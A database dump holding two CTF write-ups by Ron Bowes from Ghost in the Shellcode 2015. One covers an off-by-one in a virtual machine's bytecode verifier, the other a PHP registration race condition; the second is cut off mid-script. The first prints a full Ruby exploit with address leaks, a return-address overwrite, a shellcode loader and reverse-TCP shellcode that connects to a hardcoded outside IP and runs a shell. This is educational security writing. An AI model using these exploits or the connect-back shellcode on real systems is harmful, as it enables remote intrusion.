INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (16, 'GitS 2015: Giggles (off-by-one virtual machine)', 'Ron Bowes', '2015-1-28', 'Welcome to part 3 of my Ghost in the Shellcode writeup! Sorry for the delay, I actually just moved to Seattle. On a sidenote, if there are any Seattle hackers out there reading this, hit me up and let\'s get a drink!\nNow, down to business: this writeup is about one of the Pwnage 300 levels; specifically, Giggles, which implements a very simple and very vulnerable virtual machine. You can download the binary here, the source code here (with my comments - I put XXX near most of the vulnerabilities and bad practices I noticed), and my exploit here.\nOne really cool aspect of this level was that they gave source code, a binary with symbols, and even a client (that\'s the last time I\'ll mention their client, since I dislike Python :) )! That means we could focus on exploitation and not reversing!\n\n.smaller { font-size: 10; }\nThe virtual machine\nI\'ll start by explaining how the virtual machine actually works.  If you worked on this level yourself, or you don\'t care about the background, you can just skip over this section.\nBasically, there are three operations: TYPE_ADDFUNC, TYPE_VERIFY, and TYPE_RUNFUNC.\nThe usual process is that the user adds a function using TYPE_ADDFUNC, which is made up of one (possibly zero?) or more operations. Then the user verifies the function, which checks for bounds violations and stuff like that. Then if that succeeds, the user can run the function. The function can take up to 10 arguments and output as much as it wants.\nThere are only seven different opcodes (types of operations), and one of the tricky parts is that none of them deal with absolute values—only other registers. They are:\n\nOP_ADD reg1, reg2 - add two registers together, and store the result in reg1\nOP_BR <addr> - branch (jump) to a particular instruction - the granularity of these jumps is actually per-instruction, not per-byte, so you can\'t jump into the middle of another instruction, which ruined my initial instinct :(\nOP_BEQ <addr> <reg1> <reg2> / OP_BGT <addr> <reg1> <reg2> - branch  if equal and branch if greater than are basically the same as OP_BR, except the jumps are conditional\nOP_MOV <reg1> <reg2< - set reg1 to equal reg2\nOP_OUT <reg> - output a register (gets returned as a hex value by RUNFUNC)\nOP_EXIT - terminate the function\n\nTo expand on the output just a bit - the program maintains the output in a buffer that\'s basically a series of space-separated hex values. At the end of the program (when it either terminates or OP_EXIT is called), it\'s sent back to the client. I was initially worried that I would have to craft some hex-with-spaces shellcode, but thankfully that wasn\'t necessary. :)\nThere are 10 different registers that can be accessed. Each one is 32 bits. The operand values, however, are all 64-bit values.\nThe verification process basically ensures that the registers and the addresses are mostly sane. Once it\'s been validated, a flag is switched and the function can be called. If you call the function before verifying it, it\'ll fail immediately. If you can use arbitrary bytecode instructions, you\'d be able to address register 1000000, say, and read/write elsewhere in memory. They wanted to prevent that.\nSpeaking of the vulnerability, the bug that leads to full code execution is in the verify function - can you find it before I tell you?\nThe final thing to mention is arguments: when you call TYPE_RUNFUNC, you can pass up to I think 10 arguments, which are 32-bit values that are placed in the first 8 registers.\nFixing the binary\nI\'ve gotten pretty efficient at patching binaries for CTFs! I\'ve talked about this before, so I\'ll just mention what I do briefly.\nI do these things immediately, before I even start working on the challenge:\n\nReplace the call to alarm() with NOPs\nReplace the call to fork() with \"xor eax, eax\", followed by NOPs\nReplace the call to drop_privs() with NOPs\n (if I can find it)\n\nThat way, the process won\'t be killed after a timeout, and I can debug it without worrying about child processes holding onto ports and other irritations. NOPing out drop_privs() means I don\'t have to worry about adding a user or running it as root or creating a folder for it. If you look at the objdump outputs diffed, here\'s what it looks like:\n\r\n--- a   2015-01-27 13:30:29.000000000 -0800\r\n+++ b   2015-01-27 13:30:31.000000000 -0800\r\n@@ -1,5 +1,5 @@\r\n\r\n-giggles:     file format elf64-x86-64\r\n+giggles-fixed:     file format elf64-x86-64\r\n\r\n\r\n Disassembly of section .interp:\r\n@@ -1366,7 +1366,10 @@\r\n     125b:      83 7d f4 ff             cmp    DWORD PTR [rbp-0xc],0xffffffff\r\n     125f:      75 02                   jne    1263 <loop+0x3d>\r\n     1261:      eb 68                   jmp    12cb <loop+0xa5>\r\n-    1263:      e8 b8 fc ff ff          call   f20 <fork@plt>\r\n+    1263:      31 c0                   xor    eax,eax\r\n+    1265:      90                      nop\r\n+    1266:      90                      nop\r\n+    1267:      90                      nop\r\n     1268:      89 45 f8                mov    DWORD PTR [rbp-0x8],eax\r\n     126b:      83 7d f8 ff             cmp    DWORD PTR [rbp-0x8],0xffffffff\r\n     126f:      75 02                   jne    1273 <loop+0x4d>\r\n@@ -1374,14 +1377,26 @@\r\n     1273:      83 7d f8 00             cmp    DWORD PTR [rbp-0x8],0x0\r\n     1277:      75 48                   jne    12c1 <loop+0x9b>\r\n     1279:      bf 1e 00 00 00          mov    edi,0x1e\r\n-    127e:      e8 6d fb ff ff          call   df0 <alarm@plt>\r\n+    127e:      90                      nop\r\n+    127f:      90                      nop\r\n+    1280:      90                      nop\r\n+    1281:      90                      nop\r\n+    1282:      90                      nop\r\n     1283:      48 8d 05 b6 1e 20 00    lea    rax,[rip+0x201eb6]        # 203140 <USER>\r\n     128a:      48 8b 00                mov    rax,QWORD PTR [rax]\r\n     128d:      48 89 c7                mov    rdi,rax\r\n-    1290:      e8 43 00 00 00          call   12d8 <drop_privs_user>\r\n+    1290:      90                      nop\r\n+    1291:      90                      nop\r\n+    1292:      90                      nop\r\n+    1293:      90                      nop\r\n+    1294:      90                      nop\r\n     1295:      8b 45 ec                mov    eax,DWORD PTR [rbp-0x14]\r\n     1298:      89 c7                   mov    edi,eax\r\n\r\n\nI just use a simple hex editor on Windows, xvi32.exe, to take care of that. But you can do it in countless other ways, obviously.\nWhat\'s wrong with verifyBytecode()?\nHave you found the vulnerability yet?\nI\'ll give you a hint: look at the comparison operators in this function:\n\r\nint verifyBytecode(struct operation * bytecode, unsigned int n_ops)\r\n{\r\n    unsigned int i;\r\n    for (i = 0; i < n_ops; i++)\r\n    {\r\n        switch (bytecode[i].opcode)\r\n        {\r\n            case OP_MOV:\r\n            case OP_ADD:\r\n                if (bytecode[i].operand1 > NUM_REGISTERS)\r\n                    return 0;\r\n                else if (bytecode[i].operand2 > NUM_REGISTERS)\r\n                    return 0;\r\n                break;\r\n            case OP_OUT:\r\n                if (bytecode[i].operand1 > NUM_REGISTERS)\r\n                    return 0;\r\n                break;\r\n            case OP_BR:\r\n                if (bytecode[i].operand1 > n_ops)\r\n                    return 0;\r\n                break;\r\n            case OP_BEQ:\r\n            case OP_BGT:\r\n                if (bytecode[i].operand2 > NUM_REGISTERS)\r\n                    return 0;\r\n                else if (bytecode[i].operand3 > NUM_REGISTERS)\r\n                    return 0;\r\n                else if (bytecode[i].operand1 > n_ops)\r\n                    return 0;\r\n                break;\r\n            case OP_EXIT:\r\n                break;\r\n            default:\r\n                return 0;\r\n        }\r\n    }\r\n    return 1;\r\n}\r\n\nNotice how it checks every operation? It checks if the index is greater than the maximum value. That\'s an off-by-one error. Oops!\nInformation leak\nThere are actually a lot of small issues in this code. The first good one I noticed was actually that you can output one extra register. Here\'s what I mean (grab my exploit if you want to understand the API):\n\r\ndef demo()\r\n  s = TCPSocket.new(SERVER, PORT)\r\n\r\n  ops = []\r\n  ops << create_op(OP_OUT, 10)\r\n  add(s, ops)\r\n  verify(s, 0)\r\n  result = execute(s, 0, [])\r\n\r\n  pp result\r\nend\r\n\nThe output of that operation is:\n\"42fd35d8 \"\nWhich, it turns out, is a memory address that\'s right after a \"call\" function. A return address!? Can it be this easy!?\nIt turns out that, no, it\'s not that easy. While I can read / write to that address, effectively bypasing ASLR, it turned out to be some left-over memory from an old call. I didn\'t even end up using that leak, either, I found a better one!\nThe actual vulnerabilitiy\nAfter finding the off-by-one bug that let me read an extra register, I didn\'t really think much more about it. Later on, I came back to the verifyBytecode() function and noticed that the BR/BEQ/BGT instructions have the exact same bug! You can branch to the last instruction + 1, where it keeps running unverified memory as if it\'s bytecode!\nWhat comes after the last instruction in memory? Well, it turns out to be a whole bunch of zeroes (00 00 00 00...), then other functions you\'ve added, verified or otherwise. An instruction is 26 bytes long in memory (two bytes for the opcode, and three 64-bit operands), and the instruction \"00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\" actually maps to \"add reg0, reg0\", which is nice and safe to do over and over again (although it does screw up the value in reg0).\nAligning the interpreter\nAt this point, it got a bit complicated. Sure, I\'d found a way to break out of the sandbox to run unverified code, but it\'s not as straight forward as you might think.\nThe problem? The spacing of the different \"functions\" in memory (that is, groups of operations) aren\'t multiples of 26 bytes apart, thanks to headers, so if you break out of one function and into another, you wind up trying to execute bytecode that\'s somewhat offset.\nIn other words, if your second function starts at address 0, the interpreter tries to run the bytecode at -12 (give or take). The bytecode at -12 just happens to be the number of instructions in the function, so the first opcode is actually equal to the number of operations (so if you have three operations in the function, the first operation will be opcode 3, or BEQ). Its operands are bits and pieces of the opcodes and operands. Basically, it\'s a big mess.\nTo get this working, I wanted to basically just skip over that function altogether and run the third function (which would hopefully be a little better aligned). Basically, I wanted the function to do nothing dangerous, then continue on to the third function.\nHere\'s the code I ended up writing (sorry the formatting isn\'t great, check out the exploit I linked above to see it better):\n\r\n# This creates a valid-looking bytecode function that jumps out of bounds,\r\n# then a non-validated function that puts us in a more usable bytecode\r\n# escape\r\ndef init()\r\n  puts(\"[*] Connecting to #{SERVER}:#{PORT}\")\r\n  s = TCPSocket.new(SERVER, PORT)\r\n  #puts(\"[*] Connected!\")\r\n\r\n  ops = []\r\n\r\n  # This branches to the second instruction - which doesn\'t exist\r\n  ops << create_op(OP_BR, 1)\r\n  add(s, ops)\r\n  verify(s, 0)\r\n\r\n  # This little section takes some explaining. Basically, we\'ve escaped the bytecode\r\n  # interpreter, but we aren\'t aligned properly. As a result, it\'s really irritating\r\n  # to write bytecode (for example, the code of the first operation is equal to the\r\n  # number of operations!)\r\n  #\r\n  # Because there are 4 opcodes below, it performs opcode 4, which is \'mov\'. I ensure\r\n  # that both operands are 0, so it does \'mov reg0, reg0\'.\r\n  #\r\n  # After that, the next one is a branch (opcode 1) to offset 3, which effectively\r\n  # jumps past the end and continues on to the third set of bytecode, which is out\r\n  # ultimate payload.\r\n\r\n  ops = []\r\n  # (operand = count)\r\n  #                  |--|               |---|                                          <-- inst1 operand1 (0 = reg0)\r\n  #                          |--------|                    |----|                      <-- inst1 operand2 (0 = reg0)\r\n  #                                                                        |--|        <-- inst2 opcode (1 = br)\r\n  #                                                                  |----|            <-- inst2 operand1\r\n  ops << create_op(0x0000, 0x0000000000000000, 0x4242424242000000, 0x00003d0001434343)\r\n  #                  |--|              |----|                                          <-- inst2 operand1\r\n  ops << create_op(0x0000, 0x4444444444000000, 0x4545454545454545, 0x4646464646464646)\r\n  # The values of these don\'t matter, as long as we still have 4 instructions\r\n  ops << create_op(0xBBBB, 0x4747474747474747, 0x4848484848484848, 0x4949494949494949)\r\n  ops << create_op(0xCCCC, 0x4a4a4a4a4a4a4a4a, 0x4b4b4b4b4b4b4b4b, 0x4c4c4c4c4c4c4c4c)\r\n\r\n  # Add them\r\n  add(s, ops)\r\n\r\n  return s\r\nend\r\n\nThe comments explain it pretty well, but I\'ll explain it again. :)\nThe first opcode in the unverified function is, as I mentioned, equal to the number of operations. We create a function with 4 operations, which makes it a MOV instruction. Performing a MOV is pretty safe, especially since reg0 is already screwed up.\nThe two operands to instruction 1 are parts of the opcodes and operands of the first function. And the opcode for the second instruction is part of third operand in the first operation we create. Super confusing!\nEffectively, this ends up running:\n\r\nmov reg0, reg0\r\nbr 0x3d\r\n; [bad instructions that get skipped]\r\n\nI\'m honestly not sure why I chose 0x3d as the jump distance, I suspect it\'s just a number that I was testing with that happened to work. The instructions after the BR don\'t matter, so I just fill them in with garbage that\'s easy to recognize in a debugger.\nSo basically, this function just does nothing, effectively, which is exactly what I wanted.\nGetting back in sync\nI hoped that the third function would run perfectly, but because of math, it still doesn\'t. However, the operation count no longer matters in the third function, which is good enough for me! After doing some experiments, I determined that the instructions are unaligned by 0x10 (16) bytes. If you pad the start with 0x10 bytes then add instructions as normal, they\'ll run completely unverified.\nTo build the opcodes for the third function, I added a parameter to the add() function that lets you offset things:\n\r\n#[...]\r\n  # We have to cleanly exit\r\n  ops << create_op(OP_EXIT)\r\n\r\n  # Add the list of ops, offset by 10 (that\'s how the math worked out)\r\n  add(s, ops, 16)\r\n#[...]\r\n\nNow you can run entirely unverified bytecode instructions! That means full read/write/execute of arbitrary addresses relative to the base address of the registers array. That\'s awesome! Because the registers array is on the stack, we have read/write access relative to a stack address. That means you can trivially read/write the return address and leak addresses of the binary, libc, or anything you want. ASLR bypass and RIP control instantly!\nLeaking addresses\nThere are two separate sets of addresses that need to be leaked. It turns out that even though ASLR is enabled, the addresses don\'t actually randomize between different connections, so I can leak addresses, reconnect, leak more addresses, reconnect, and run the exploit. It\'s not the cleanest way to solve the level, but it worked! If this didn\'t work, I could have written a simple multiplexer bytecode function that does all these things using the same function.\nI mentioned I can trivially leak the binary address and a stack address. Here\'s how:\n\r\n# This function leaks two addresses: a stack address and the address of\r\n# the binary image (basically, defeating ASLR)\r\ndef leak_addresses()\r\n  puts(\"[*] Bypassing ASLR by leaking stack/binary addresses\")\r\n  s = init()\r\n\r\n  # There\'s a stack address at offsets 24/25\r\n  ops = []\r\n  ops << create_op(OP_OUT, 24)\r\n  ops << create_op(OP_OUT, 25)\r\n\r\n  # 26/27 is the return address, we\'ll use it later as well!\r\n  ops << create_op(OP_OUT, 26)\r\n  ops << create_op(OP_OUT, 27)\r\n\r\n  # We have to cleanly exit\r\n  ops << create_op(OP_EXIT)\r\n\r\n  # Add the list of ops, offset by 10 (that\'s how the math worked out)\r\n  add(s, ops, 16)\r\n\r\n  # Run the code\r\n  result = execute(s, 0, [])\r\n\r\n  # The result is a space-delimited array of hex values, convert it to\r\n  # an array of integers\r\n  a = result.split(/ /).map { |str| str.to_i(16) }\r\n\r\n  # Read the two values in and do the math to calculate them\r\n  @@registers = ((a[1] << 32) | (a[0])) - 0xc0\r\n  @@base_addr = ((a[3] << 32) | (a[2])) - 0x1efd\r\n\r\n  # User output\r\n  puts(\"[*] Found the base address of the register array: 0x#{@@registers.to_s(16)}\")\r\n  puts(\"[*] Found the base address of the binary: 0x#{@@base_addr.to_s(16)}\")\r\n\r\n  s.close\r\nend\r\n\nBasically, we output registers 24, 25, 26, and 27. Since the OUT function is 4 bytes, you have to call OUT twice to leak a 64-bit address.\nRegisters 24 and 25 are an address on the stack. The address is 0xc0 bytes above the address of the registers variable (which is the base address of our overflow, and therefore needed for calculating offsets), so we subtract that. I determined the 0xc0 value using a debugger.\nRegisters 26 and 27 are the return address of the current function, which happens to be 0x1efd bytes into the binary (determined with IDA). So we subtract that value from the result and get the base address of the binary.\nI also found a way to leak a libc address here, but since I never got a copy of libc I didn\'t bother keeping that code around.\nNow that we have the base address of the binary and the address of the registers, we can use the OUT and MOV operations, plus a little bit of math, to read and write anywhere in memory.\nQuick aside: getting enough sleep\nYou may not know this, but I work through CTF challenges very slowly. I like to understand every aspect of everything, so I don\'t rush. My secret is, I can work tirelessly at these challenges until they\'re complete. But I\'ll never win a race.\nI got to this point at around midnight, after working nearly 10 hours on this challenge. Most CTFers will wonder why it took 10 hours to get here, so I\'ll explain again: I work slowly. :)\nThe problem is, I forgot one very important fact: that the operands to each operation are all 64-bit values, even though the arguments and registers themselves are 32-bit. That means we can calculate an address from the register array to anywhere in memory. I thought they were 32 bit, however, and since the process is 64-bit Ii\'d be able to read/write the stack, but not addresses the binary! That wasn\'t true, I could write anywhere, but I didn\'t know that. So I was trying a bunch of crazy stack stuff to get it working, but ultimately failed.\nAt around 2am I gave up and played video games for an hour, then finished the book I was reading. I went to bed about 3:30am, still thinking about the problem. Laying in bed about 4am, it clicked in that register numbers could be 64-bit, so I got up and finished it up for about 7am. :)\nThe moral of this story is: sometimes it pays to get some rest when you\'re struggling with a problem!\n+rwx memory!?\nThe authors of the challenge must have been feeling extremely generous: they gave us a segment of memory that\'s readable, writeable, and executable! You can write code to it then run it! Here\'s where it\'s declared:\n\r\nvoid * JIT;     // TODO: add code to JIT functions\r\n\r\n//[...]\r\n\r\n    /* Map 4096 bytes of executable memory */\r\n    JIT = mmap(0, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\r\n\nA pointer to the memory is stored in a global variable. Since we have the ability to read an arbitrary address—once I realized my 64-bit problem—it was pretty easy to read the pointer:\n\r\ndef leak_rwx_address()\r\n  puts(\"[*] Attempting to leak the address of the mmap()\'d +rwx memory...\")\r\n  s = init()\r\n\r\n  # This offset is always constant, from the binary\r\n  jit_ptr = @@base_addr + 0x20f5c0\r\n\r\n  # Read both halves of the address - the read is relative to the stack-\r\n  # based register array, and has a granularity of 4, hence the math\r\n  # I\'m doing here\r\n  ops = []\r\n  ops << create_op(OP_OUT, (jit_ptr - @@registers) / 4)\r\n  ops << create_op(OP_OUT, ((jit_ptr + 4) - @@registers) / 4)\r\n  ops << create_op(OP_EXIT)\r\n  add(s, ops, 16)\r\n  result = execute(s, 0, [])\r\n\r\n  # Convert the result from a space-delimited hex list to an integer array\r\n  a = result.split(/ /).map { |str| str.to_i(16) }\r\n\r\n  # Read the address\r\n  @@rwx_addr = ((a[1] << 32) | (a[0]))\r\n\r\n  # User output\r\n  puts(\"[*] Found the +rwx memory: 0x#{@@rwx_addr.to_s(16)}\")\r\n\r\n  s.close\r\nend\r\n\r\n\nBasically, we know the pointer to the JIT code is at the base_addr + 0x20f5c0 (determined with IDA). So we do some math with that address and the base address of the registers array (dividing by 4 because that\'s the width of each register).\nFinishing up\nNow that we can run arbitrary bytecode instructions, we can read, write, and execute any address. But there was one more problem: getting the code into the JIT memory.\nIt seems pretty straight forward, since we can write to arbitrary memory, but there\'s a problem: you don\'t have any absolute values in the assembly language, which means I can\'t directly write a bunch of values to memory. What I could do, however, is write values from registers to memory, and I can set the registers by passing in arguments.\nBUT, reg0 gets messed up and two registers are wasted because I have to use them to overwrite the return address. That means I have 7 32-bit registers that I can use.\nWhat you\'re probably thinking is that I can implement a multiplexer in their assembly language. I could have some operands like \"write this dword to this memory address\" and build up the shellcode by calling the function multiple times with multiple arguments.\nIf you\'re thinking that, then you\'re sharper than I was at 7am with no sleep! I decided that the best way was to write a shellcode loader in 24 bytes. I actually love writing short, custom-purpose shellcode, there\'s something satisfying about it. :)\nHere\'s my loader shellcode:\n\r\n  # Create some loader shellcode. I\'m not proud of this - it was 7am, and I hadn\'t\r\n  # slept yet. I immediately realized after getting some sleep that there was a\r\n  # way easier way to do this...\r\n  params =\r\n    # param0 gets overwritten, just store crap there\r\n    \"\\x41\\x41\\x41\\x41\" +\r\n\r\n    # param1 + param2 are the return address\r\n    [@@rwx_addr & 0x00000000FFFFFFFF, @@rwx_addr >> 32].pack(\"II\") +\r\n\r\n    # ** Now, we build up to 24 bytes of shellcode that\'ll load the actual shellcode\r\n\r\n    # Decrease ECX to a reasonable number (somewhere between 200 and 10000, doesn\'t matter)\r\n    \"\\xC1\\xE9\\x10\" +  # shr ecx, 10\r\n\r\n    # This is where the shellcode is read from - to save a couple bytes (an absolute move is 10\r\n    # bytes long!), I use r12, which is in the same image and can be reached with a 4-byte add\r\n    \"\\x49\\x8D\\xB4\\x24\\x88\\x2B\\x20\\x00\" + # lea rsi,[r12+0x202b88]\r\n\r\n    # There is where the shellcode is copied to - immediately after this shellcode\r\n    \"\\x48\\xBF\" + [@@rwx_addr + 24].pack(\"Q\") + # mov rdi, @@rwx_addr + 24\r\n\r\n    # And finally, this moves the bytes over\r\n    \"\\xf3\\xa4\" # rep movsb\r\n\r\n  # Pad the shellcode with NOP bytes so it can be used as an array of ints\r\n  while((params.length % 4) != 0)\r\n    params += \"\\x90\"\r\n  end\r\n\r\n  # Convert the shellcode to an array of ints\r\n  params = params.unpack(\"I*\")\r\n\nBasically, the first three arguments are wasted (the first gets messed up and the next two are the return address). Then we set up a call to \"rep movsb\", with rsi, rdi, and rcx set appropriately (and complicatedly). You can see how I did that in the comments. All told, it\'s 23 bytes of machine code.\nIt took me a lot of time to get that working, though! Squeezing out every single byte! It basically copies the code from the next bytecode function (whose address I can calculate based on r12) to the address immediately after itself in the +RWX memory (which I can leak beforehand).\nThis code is written to the +RWX memory using these operations:\n\r\n  ops = []\r\n\r\n  # Overwrite teh reteurn address with the first two operations\r\n  ops << create_op(OP_MOV, 26, 1)\r\n  ops << create_op(OP_MOV, 27, 2)\r\n\r\n  # This next bunch copies shellcode from the arguments into the +rwx memory\r\n  ops << create_op(OP_MOV, ((@@rwx_addr + 0) - @@registers) / 4, 3)\r\n  ops << create_op(OP_MOV, ((@@rwx_addr + 4) - @@registers) / 4, 4)\r\n  ops << create_op(OP_MOV, ((@@rwx_addr + 8) - @@registers) / 4, 5)\r\n  ops << create_op(OP_MOV, ((@@rwx_addr + 12) - @@registers) / 4, 6)\r\n  ops << create_op(OP_MOV, ((@@rwx_addr + 16) - @@registers) / 4, 7)\r\n  ops << create_op(OP_MOV, ((@@rwx_addr + 20) - @@registers) / 4, 8)\r\n  ops << create_op(OP_MOV, ((@@rwx_addr + 24) - @@registers) / 4, 9)\r\n\nThen I just convert the shellcode into a bunch of bytecode operators / operands, which will be the entirity of the fourth bytecode function (I\'m proud to say that this code worked on the first try):\n\r\n  # Pad the shellcode to the proper length\r\n  shellcode = SHELLCODE\r\n  while((shellcode.length % 26) != 0)\r\n    shellcode += \"\\xCC\"\r\n  end\r\n\r\n  # Now we create a new function, which simply stores the actual shellcode.\r\n  # Because this is a known offset, we can copy it to the +rwx memory with\r\n  # a loader\r\n  ops = []\r\n\r\n  # Break the shellcode into 26-byte chunks (the size of an operation)\r\n  shellcode.chars.each_slice(26) do |slice|\r\n    # Make the character array into a string\r\n    slice = slice.join\r\n\r\n    # Split it into the right proportions\r\n    a, b, c, d = slice.unpack(\"SQQQ\")\r\n\r\n    # Add them as a new operation\r\n    ops << create_op(a, b, c, d)\r\n  end\r\n\r\n  # Add the operations to a new function (no offset, since we just need to\r\n  # get it stored, not run as bytecode)\r\n  add(s, ops, 16)\r\n\nAnd, for good measure, here\'s my 64-bit connect-back shellcode:\n\r\n# Port 17476, chosen so I don\'t have to think about endianness at 7am at night :)\r\nREVERSE_PORT = \"\\x44\\x44\"\r\n\r\n# 206.220.196.59\r\nREVERSE_ADDR = \"\\xCE\\xDC\\xC4\\x3B\"\r\n\r\n# Simple reverse-tcp shellcode I always use\r\nSHELLCODE = \"\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\x4d\\x31\\xc0\\x6a\" +\r\n\"\\x02\\x5f\\x6a\\x01\\x5e\\x6a\\x06\\x5a\\x6a\\x29\\x58\\x0f\\x05\\x49\\x89\\xc0\" +\r\n\"\\x48\\x31\\xf6\\x4d\\x31\\xd2\\x41\\x52\\xc6\\x04\\x24\\x02\\x66\\xc7\\x44\\x24\" +\r\n\"\\x02\" + REVERSE_PORT + \"\\xc7\\x44\\x24\\x04\" + REVERSE_ADDR + \"\\x48\\x89\\xe6\\x6a\\x10\" +\r\n\"\\x5a\\x41\\x50\\x5f\\x6a\\x2a\\x58\\x0f\\x05\\x48\\x31\\xf6\\x6a\\x03\\x5e\\x48\" +\r\n\"\\xff\\xce\\x6a\\x21\\x58\\x0f\\x05\\x75\\xf6\\x48\\x31\\xff\\x57\\x57\\x5e\\x5a\" +\r\n\"\\x48\\xbf\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xef\\x08\\x57\\x54\" +\r\n\"\\x5f\\x6a\\x3b\\x58\\x0f\\x05\"\r\n\r\n\nIt\'s slightly modified from some code I found online. I\'m mostly just including it so I can find it again next time I need it. :)\nConclusion\nTo summarize everything...\nThere was an off-by-one vulnerability in the verifyBytecode() function. I used that to break out of the sandbox and run unverified bytecode.\nThat bytecode allowed me to read/write/execute arbitrary memory. I used it to leak the base address of the binary, the base address of the register array (where my reads/writes are relative to), and the address of some +RWX memory.\nI copied loader code into that +RWX memory, then ran it. It copied the next bytecode function, as actual machine code, to the +RWX memory.\nThen I got a shell.\nHope that was useful!', '\'GITS2015\', \'Hacking\'', 'https://blog.skullsecurity.org/2015/gits-2015-giggles-off-by-one-virtual-machine');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (17, 'GitS 2015: aart.php (race condition)', 'Ron Bowes', '2015-1-21', 'Welcome to my second writeup for Ghost in the Shellcode 2015! This writeup is for the one and only Web level, \"aart\" (download it). I wanted to do a writeup for this one specifically because, even though the level isn\'t super exciting, the solution was actually a pretty obscure vulnerability type that you don\'t generally see in CTFs: a race condition!\nBut we\'ll get to that after, first I want to talk about a wrong path that I spent a lot of time on. :)\n\nThe wrong path\nIf you aren\'t interested in the trial-and-error process, you can skip this section—don\'t worry, you won\'t miss anything useful.\nI like to think of myself as being pretty good at Web stuff. I mean, it\'s a large part of my job and career. So when I couldn\'t immediately find the vulnerability on a small PHP app, I felt like a bit of an idiot.\nI immediately noticed a complete lack of cross-site scripting and cross-site request forgery protections, but those don\'t lead to code execution so I needed something more. I also immediately noticed an auth bypass vulnerability, where the server would tell you the password for a chosen user if you simply try to log in and type the password incorrectly. I also quickly noticed that you could create multiple accounts with the same name! But none of that was ultimately helpful (except the multiple accounts, actually).\nEventually, while scanning code over and over, I noticed this interesting construct in vote.php:\n\r\n<?php\r\nif($type === \"up\"){\r\n        $sql = \"UPDATE art SET karma=karma+1 where id=\'$id\';\";\r\n} elseif($type === \"down\"){\r\n        $sql = \"UPDATE art SET karma=karma-1 where id=\'$id\';\";\r\n}\r\n\r\nmysqli_query($conn, $sql);\r\n?>\r\n\r\nmysqli_query($conn, $sql);\r\n\nBefore that block, $sql wasn\'t initialized. The block doesn\'t necessarily initialize it before it\'s used. That led me to an obvious conclusion: register_globals (aka, \"remote administration for Joomla\")!\nI tried a few things to test it, but because the result of mysqli_query isn\'t actually used and errors aren\'t displayed, it was difficult to tell what was happening. I ended up setting up a local version of the challenge on a Debian VM just so I could play around (I find that having a good debug environment is a key to CTF success!)\nAfter getting it going and turning on register_globals, and messing around a bunch, I found a good query I could use:\nhttp://192.168.42.120/vote.php?sql=UPDATE+art+SET+karma=1000000+where+id=\'1\'\nThat worked on my test app, so I confidently strode to the real app, ran it, and... nothing happened. Rats. Back to the drawing board.\nThe real vulnerability\nSo, the goal of the application was to obtain a user account that isn\'t restricted. When you create an account, it\'s immediately set to \"restricted\" by this code in register.php:\n\r\n<?php\r\nif(isset($_POST[\'username\'])){\r\n        $username = mysqli_real_escape_string($conn, $_POST[\'username\']);\r\n        $password = mysqli_real_escape_string($conn, $_POST[\'password\']);\r\n\r\n        $sql = \"INSERT into users (username, password) values (\'$username\', \'$password\');\";\r\n        mysqli_query($conn, $sql);\r\n\r\n        $sql = \"INSERT into privs (userid, isRestricted) values ((select users.id from users where username=\'$username\'), TRUE);\";\r\n        mysqli_query($conn, $sql);\r\n        ?>\r\n        <h2>SUCCESS!</h2>\r\n        <?php\r\n} else {\r\n[...]\r\n}\r\n?>\r\n\nThen on the login page, it\'s checked using this code:\n\r\n<?php\r\nif(isset($_POST[\'username\'])){\r\n        $username = mysqli_real_escape_string($conn, $_POST[\'username\']);\r\n\r\n        $sql = \"SELECT * from users where username=\'$username\';\";\r\n        $result = mysqli_query($conn, $sql);\r\n\r\n        $row = $result->fetch_assoc();\r\n        var_dump($_POST);\r\n        var_dump($row);\r\n\r\n        if($_POST[\'username\'] === $row[\'username\'] and $_POST[\'password\'] === $row[\'password\']){\r\n                ?>\r\n                <h1>Logged in as <?php echo($username);?></h1>\r\n                <?php\r\n\r\n                $uid = $row[\'id\'];\r\n                $sql = \"SELECT isRestricted from privs where userid=\'$uid\' and isRestricted=TRUE;\";\r\n                $result = mysqli_query($conn, $sql);\r\n                $row = $result->fetch_assoc();\r\n                if($row[\'isRestricted\']){\r\n                        ?>\r\n                        <h2>This is a restricted account</h2>\r\n\r\n                        <?php\r\n                }else{\r\n                        ?>\r\n                        <h2><?php include(\'../key\');?></h2>\r\n                        <?php\r\n\r\n                }\r\n\r\n\r\n        ?>\r\n        <h2>SUCCESS!</h2>\r\n        <?php\r\n        }\r\n} else {\r\n[...]\r\n}\r\n\nMy gut reaction for far too long was that it\'s impossible to bypass that check, because it only selects rows where isRestricted=true!\nBut after fighting with the register_globals non-starter above, I realized that if there were no matching rows in the privs database, it would return zero results and the check would pass, allowing me access! But how to do that?\nI went back to the user creation code in register.php and noticed that the creation code creates the user, then restricts it! There\'s a lesson to programmers: secure by default.\n\r\n$sql = \"INSERT into users (username, password) values (\'$username\', \'$password\');\";\r\nmysqli_query($conn, $sql);\r\n\r\n$sql = \"INSERT into privs (userid, isRestricted) values ((select users.id from users where username=\'$username\'), TRUE);\";\r\nmysqli_query($conn, $sql);\r\n\nThat means, if you can create a user account and log in immediately after, before the second query runs, then you can successfully get the key! But I didn\'t notice that till later, like, today. I actually found another path to exploitation! :)\nMy exploit\nThis is where things get a little confusing....\nI first noticed there\'s a similar vulnerability in the code that inserts the account restriction into the user table. There\'s no logic in the application to prevent the creation of multiple user accounts with the same name! And, if you create multiple accounts with the same name, it looked like only the first account would ever get restricted.\nThat was my reasoning, anyways (I don\'t think that\'s actually true, but that turned out not to matter). However, on login, only the first account is actually retrieved from the database! My thought was, if you could get those two SQL statements to run concurrently, so they run intertwined between two processes, it might just put things in the right order for an exploit!\nSorry if that\'s confusing to you—that logic is flawed in like every way imaginable, I realized afterwards, but I implemented the code anyways. Here\'s the main part (you can grab the full exploit here):\n\r\nrequire \'httparty\'\r\n\r\nTARGET = \"http://aart.2015.ghostintheshellcode.com/\"\r\n#TARGET = \"http://192.168.42.120/\"\r\n\r\nname = \"ron\" + rand(100000).to_s(16)\r\n\r\nfork()\r\n\r\nt1 = Thread.new do |t|\r\n  response = (HTTParty.post(\"#{TARGET}/register.php\", :body => { :username => name, :password => name }))\r\nend\r\n\r\nt2 = Thread.new do |t|\r\n  